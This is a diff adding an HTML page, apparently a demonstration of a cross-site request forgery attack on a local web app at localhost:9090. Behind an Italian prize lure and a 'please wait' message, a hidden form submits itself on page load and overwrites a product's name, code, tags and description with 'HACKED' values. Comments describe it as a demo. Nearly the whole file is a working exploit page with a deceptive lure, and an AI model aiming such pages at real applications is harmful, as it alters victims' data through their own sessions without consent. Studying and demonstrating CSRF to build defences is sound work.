@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Clicca qui per un premio!</title>
+</head>
+<body onload="document.forms[0].submit()">
+
+    <h1>Attendere prego, stiamo processando il tuo premio...</h1>
+
+    <form id="csrf-form" action="http://localhost:9090/app/modifyproduct" method="post" style="display:none;">
+
+        <input type="hidden" name="id" value="123"> <input type="hidden" name="name" value="Prodotto Modificato da CSRF">
+        <input type="hidden" name="code" value="HACKED">
+        <input type="hidden" name="tags" value="csrf,hacked,security">
+        <input type="hidden" name="description" value="Questo prodotto è stato modificato tramite un attacco CSRF.">
+
+    </form>
+
+    <script>
+        // Per sicurezza, molti browser moderni bloccano l'invio automatico cross-site.
+        // Se onload non dovesse funzionare, puoi usare un pulsante per rendere la demo più interattiva.
+        // In un attacco reale, l'attaccante userebbe tecniche più sofisticate.
+        // document.getElementById('csrf-form').submit(); // Alternativa all'onload
+    </script>
+
+</body>
+</html>
